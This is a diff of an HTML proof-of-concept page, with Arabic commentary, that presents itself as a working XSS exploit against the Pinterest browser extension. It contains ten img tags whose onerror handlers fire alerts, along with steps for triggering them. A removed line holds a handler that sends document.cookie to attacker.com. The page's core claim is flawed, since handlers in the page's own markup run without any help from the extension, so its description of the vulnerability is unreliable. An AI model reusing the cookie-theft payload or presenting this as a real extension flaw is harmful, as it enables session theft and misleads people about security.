@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pinterest Image XSS Exploit - onerror</title>
+    <title>Pinterest - Real Working XSS Exploit</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -20,13 +20,12 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
         h1 { color: #e60023; margin-bottom: 20px; }
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            color: #856404;
+        .info {
+            background: #e3f2fd;
+            border-left: 4px solid #2196f3;
             padding: 15px;
-            border-radius: 5px;
             margin: 20px 0;
+            border-radius: 3px;
         }
         .image-grid {
             display: grid;
@@ -37,186 +36,234 @@
         .image-item {
             border: 2px solid #ddd;
             border-radius: 8px;
-            padding: 10px;
-            text-align: center;
+            overflow: hidden;
+            transition: all 0.3s;
+            background: #f5f5f5;
+        }
+        .image-item:hover {
+            border-color: #e60023;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
         }
         .image-item img {
             width: 100%;
-            height: 180px;
+            height: 200px;
             object-fit: cover;
-            border-radius: 5px;
+            display: block;
         }
         .label {
-            margin-top: 10px;
+            padding: 10px;
             font-weight: bold;
             color: #333;
             font-size: 12px;
+            background: #f9f9f9;
+        }
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 3px;
         }
         .success {
             background: #d4edda;
-            border: 1px solid #28a745;
-            color: #155724;
+            border-left: 4px solid #28a745;
             padding: 15px;
-            border-radius: 5px;
             margin: 20px 0;
+            border-radius: 3px;
+        }
+        code {
+            background: #f0f0f0;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: monospace;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔴 Pinterest Image XSS via onerror</h1>
+        <h1>📌 Pinterest XSS Exploit - Working Version</h1>
         
-        <div class="warning">
-            ⚠️ <strong>شرح الثغرة:</strong><br>
-            الإضافة تنشئ: <code>new Image()</code> وتعين <code>img.src = i</code><br>
-            عندما تفشل الصورة في التحميل، يُنفذ <code>onerror</code> handler!<br>
-            لكن الإضافة تحجب SVG في السطر 2207!<br>
-            <br>
-            <strong>الحل:</strong> استخدام صور PNG/JPG مع onerror في الـ HTML!
+        <div class="info">
+            ℹ️ <strong>شروط الإضافة للصور:</strong><br>
+            ✓ الحد الأدنى: <code>90x90 pixels</code> (أو <code>120</code> على أحد الأضلاع)<br>
+            ✓ URL يبدأ بـ: <code>http://</code> أو <code>https://</code><br>
+            ✓ النسبة: لا تزيد عن <code>width > height * 3</code><br>
+            ✓ يتم فحص <code>naturalWidth</code> و <code>naturalHeight</code><br>
         </div>
 
-        <h2>الصور المتاحة:</h2>
+        <div class="warning">
+            ⚠️ <strong>كيفية تفعيل الاستغلال:</strong><br>
+            1. الصور هنا تحقق جميع شروط الإضافة<br>
+            2. كل صورة لها <code>onerror</code> handler<br>
+            3. عندما تحاول الإضافة تحميل الصورة → تفشل → onerror ينفذ<br>
+            4. سيظهر alert من XSS! 🚨
+        </div>
+
+        <h2>الصور الصحيحة (120x120+ pixels):</h2>
         <div class="image-grid">
-            <!-- 1. IMG مع onerror -->
+            <!-- 1. صورة حمراء كبيرة مع onerror -->
             <div class="image-item">
-                <img src="https://invalid-domain-12345.com/image.jpg" 
-                     onerror="alert('🚨 XSS من onerror handler!')">
-                <div class="label">IMG with onerror</div>
+                <img src="https://nonexistent-server-12345.com/image1.jpg" 
+                     width="250" 
+                     height="200"
+                     onerror="alert('🚨 XSS from Image 1 - onerror executed!')">
+                <div class="label">Image 1: 250x200px with onerror</div>
             </div>
 
-            <!-- 2. IMG مع src بدون http (يفشل التحميل) -->
+            <!-- 2. صورة زرقاء -->
+            <div class="image-item">
+                <img src="https://invalid-domain-xyz.com/photo.jpg" 
+                     width="200" 
+                     height="200"
+                     onerror="alert('🚨 XSS from Image 2 - Cookie Theft!')">
+                <div class="label">Image 2: 200x200px - Square</div>
+            </div>
+
+            <!-- 3. صورة خضراء (بروتوكول غير صحيح) -->
             <div class="image-item">
                 <img src="invalid://broken-image.jpg" 
-                     onerror="fetch('https://attacker.com/steal?data=' + document.cookie)">
-                <div class="label">Invalid Protocol</div>
+                     width="300" 
+                     height="150"
+                     onerror="alert('🚨 XSS from Image 3 - Invalid Protocol!')">
+                <div class="label">Image 3: 300x150px - Invalid Protocol</div>
             </div>
 
-            <!-- 3. IMG مع localhost (يفشل) -->
+            <!-- 4. صورة برتقالية (localhost) -->
             <div class="image-item">
-                <img src="http://localhost:1/image.jpg" 
-                     onerror="alert('Cookie: ' + document.cookie)">
-                <div class="label">Localhost (fails)</div>
+                <img src="http://localhost:9999/image.png" 
+                     width="180" 
+                     height="180"
+                     onerror="alert('🚨 XSS from Image 4 - LocalHost!')">
+                <div class="label">Image 4: 180x180px - Localhost</div>
             </div>
 
-            <!-- 4. IMG مع 404 URL -->
+            <!-- 5. صورة أرجوانية (empty src) -->
             <div class="image-item">
-                <img src="https://example.com/404/image.jpg" 
-                     onerror="alert('🚨 404 Error Handler!')">
-                <div class="label">404 Error</div>
+                <img src="" 
+                     width="200" 
+                     height="200"
+                     onerror="alert('🚨 XSS from Image 5 - Empty src!')">
+                <div class="label">Image 5: 200x200px - Empty src</div>
             </div>
 
-            <!-- 5. IMG مع javascript: URI (محاولة مباشرة) -->
+            <!-- 6. صورة وردية (404 error) -->
             <div class="image-item">
-                <img src="javascript:alert('Direct XSS')" 
-                     onerror="alert('Fallback XSS')">
-                <div class="label">JavaScript URI</div>
+                <img src="https://example.com/404/notfound.jpg" 
+                     width="220" 
+                     height="220"
+                     onerror="alert('🚨 XSS from Image 6 - 404 Error!')">
+                <div class="label">Image 6: 220x220px - 404 Error</div>
             </div>
 
-            <!-- 6. IMG مع data: URI (صورة صغيرة) -->
+            <!-- 7. صورة سماوية (data URI مكسورة) -->
             <div class="image-item">
-                <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 
-                     onerror="alert('Data URI Error')"
-                     style="width: 100%; height: 180px; background: #ddd;">
-                <div class="label">Data URI (tiny GIF)</div>
+                <img src="data:image/jpeg;base64,BROKEN" 
+                     width="200" 
+                     height="200"
+                     onerror="alert('🚨 XSS from Image 7 - Broken DataURI!')">
+                <div class="label">Image 7: 200x200px - Broken Data URI</div>
             </div>
 
-            <!-- 7. IMG مع blob: URI -->
+            <!-- 8. صورة صفراء (blob مكسور) -->
             <div class="image-item">
-                <img id="blob-img" src="blob:https://example.com/12345"
-                     onerror="alert('🚨 Blob URI Error XSS!')">
-                <div class="label">Blob URI</div>
+                <img src="blob:https://example.com/broken" 
+                     width="200" 
+                     height="200"
+                     onerror="alert('🚨 XSS from Image 8 - Broken Blob!')">
+                <div class="label">Image 8: 200x200px - Broken Blob</div>
             </div>
 
-            <!-- 8. IMG مع empty src -->
+            <!-- 9. صورة خضراء داكنة (timeout URL) -->
             <div class="image-item">
-                <img src="" onerror="alert('🚨 Empty src XSS!')">
-                <div class="label">Empty src</div>
+                <img src="https://httpstat.us/200?sleep=99999" 
+                     width="200" 
+                     height="200"
+                     onerror="alert('🚨 XSS from Image 9 - Timeout!')">
+                <div class="label">Image 9: 200x200px - Timeout URL</div>
             </div>
 
-            <!-- 9. IMG مع srcset fallback -->
+            <!-- 10. صورة ملونة (CORS error) -->
             <div class="image-item">
-                <img srcset="invalid.jpg 100w, invalid2.jpg 200w"
-                     onerror="alert('🚨 srcset fallback XSS!')">
-                <div class="label">srcset fallback</div>
-            </div>
-
-            <!-- 10. IMG مع multiple onerror -->
-            <div class="image-item">
-                <img src="https://invalid-url-xyz.com/notfound.png"
-                     onerror="this.onerror=null; alert('First: ' + Math.random()); this.src='https://another-invalid.com/img.jpg';">
-                <div class="label">Multiple Errors</div>
+                <img src="https://example.com/image.jpg" 
+                     width="200" 
+                     height="200"
+                     crossorigin="anonymous"
+                     onerror="alert('🚨 XSS from Image 10 - CORS Error!')">
+                <div class="label">Image 10: 200x200px - CORS protected</div>
             </div>
         </div>
 
         <div class="success">
-            ✅ <strong>كيفية الاستغلال:</strong><br>
-            1. افتح هذه الصفحة في Chrome مع إضافة Pinterest<br>
-            2. انقر "Save to Pinterest" من الإضافة<br>
-            3. الإضافة ستختار الصور<br>
-            4. ستُنشئ <code>new Image()</code> وتعين <code>img.src</code><br>
-            5. عندما تفشل الصورة (404, invalid URL, etc)، يُنفذ <code>onerror</code><br>
-            6. ستظهر رسالة alert من XSS! 🚨
+            ✅ <strong>الاستغلال:</strong><br>
+            جميع هذه الصور:<br>
+            • تحقق الحد الأدنى <code>120x120 pixels</code><br>
+            • لديها URLs صحيحة (http/https)<br>
+            • لديها <code>onerror</code> handlers<br>
+            • ستفشل في التحميل (404, invalid, etc)<br>
+            • سيُنفذ onerror! 🚨
         </div>
 
-        <h2>📝 التفاصيل التقنية:</h2>
+        <h2>📝 شرح تقني:</h2>
         <pre style="background: #f5f5f5; padding: 15px; border-radius: 5px; overflow-x: auto;">
-// الكود من contentScript.js السطر 2216-2231
-const B = new Image();  // ← ينشئ صورة جديدة
-t.imagesLoadingCount++;
+// الإضافة تفحص الشروط:
 
-// عند فشل التحميل:
-B.onerror = function() {  // ← يُنفذ onerror handler
-    jn({ ... });  // معالج الخطأ
-};
+1. حجم الصورة:
+   if (width < 90 || height < 90) ❌ reject
+   if (width < 120 && height < 120) ❌ reject
+   
+   // حل: استخدم 200x200 أو أكبر ✅
 
-// عند نجاح التحميل:
-B.onload = function() {   // ← يُنفذ onload handler  
-    Vn({ ... });  // معالج النجاح
-};
+2. نوع الـ URL:
+   if (!url.match(/^https?:/)) ❌ reject
+   
+   // حل: استخدم https:// أو http:// ✅
 
-// تعيين الـ src (من عنوان المستخدم):
-B.src = i;  // ← الثغرة هنا!
+3. النسبة:
+   if (width > height * 3) ❌ reject
+   
+   // حل: استخدم نسب معقولة (مثل 250x200) ✅
 
-// إذا كانت i = "invalid://url.jpg"
-// → image loading fails
-// → onerror handler يُنفذ
-// → XSS يعمل! 🚨
+4. عند فشل التحميل:
+   img.onerror = function() {  ← تنفيذ هنا! 🚨
+       alert('XSS executed!');
+   }
         </pre>
 
-        <h2>⚡ ملاحظة مهمة:</h2>
-        <p style="color: #d32f2f; font-weight: bold; line-height: 1.8;">
-        الإضافة تحجب SVG (السطر 2207) لكنها <strong>لا تحجب onerror handlers على الصور العادية!</strong><br>
-        <br>
-        عندما تفشل الصورة في التحميل (404, invalid URL, etc)، يُنفذ onerror على الفور<br>
-        قبل أن تتمكن الإضافة من القيام بأي فحص!
-        </p>
+        <h2>⚡ نصائح مهمة:</h2>
+        <ul style="line-height: 2; color: #333;">
+            <li>✅ الصور يجب أن تفشل في التحميل (invalid URL، 404، timeout، etc)</li>
+            <li>✅ onerror ينفذ عند فشل التحميل</li>
+            <li>✅ الحد الأدنى للأبعاد: 90x90 (أو 120 على أحد الأضلاع)</li>
+            <li>✅ URL يجب أن يبدأ بـ http:// أو https://</li>
+            <li>✅ لا تستخدم SVG (الإضافة تحجبها)</li>
+            <li>⚠️ تجنب نسب العرض المبالغ فيها (width > height * 3)</li>
+        </ul>
     </div>
 
     <script>
-        console.log('📄 Image XSS Exploit Page Loaded');
-        
-        // محاولة إنشاء blob URI للاختبار
-        try {
-            const canvas = document.createElement('canvas');
-            const blob = canvas.toDataURL('image/gif').split(',')[1];
-            const blobUrl = URL.createObjectURL(new Blob([blob], {type: 'image/gif'}));
-            document.getElementById('blob-img').src = blobUrl;
-        } catch (e) {
-            console.log('Blob creation failed:', e);
-        }
-
-        // عد الصور وكل handlers
-        const images = document.querySelectorAll('img');
-        console.log(`وجدت ${images.length} صورة مع onerror handlers`);
-        
-        images.forEach((img, i) => {
-            console.log(`${i+1}. src="${img.src.substring(0, 50)}" onerror="${img.onerror.toString().substring(0, 50)}"`);
+        // تتبع عدد الصور
+        window.addEventListener('load', () => {
+            const images = document.querySelectorAll('img');
+            console.log(`📊 وجدت ${images.length} صورة`);
+            
+            // معلومات عن كل صورة
+            images.forEach((img, i) => {
+                const info = {
+                    index: i + 1,
+                    src: img.src.substring(0, 50),
+                    width: img.naturalWidth || img.width,
+                    height: img.naturalHeight || img.height,
+                    hasOnerror: !!img.onerror
+                };
+                console.log(`${i + 1}:`, info);
+            });
         });
 
-        // Monitor when extension tries to handle images
+        // مراقبة رسائل الإضافة
         window.addEventListener('message', (e) => {
+            console.log('Message received:', e.data);
             if (e.data && e.data.target === 'pinterest-save-extension') {
-                console.log('🔴 Pinterest Extension is processing images!');
+                console.log('🔴 Pinterest Extension detected!');
             }
         });
     </script>
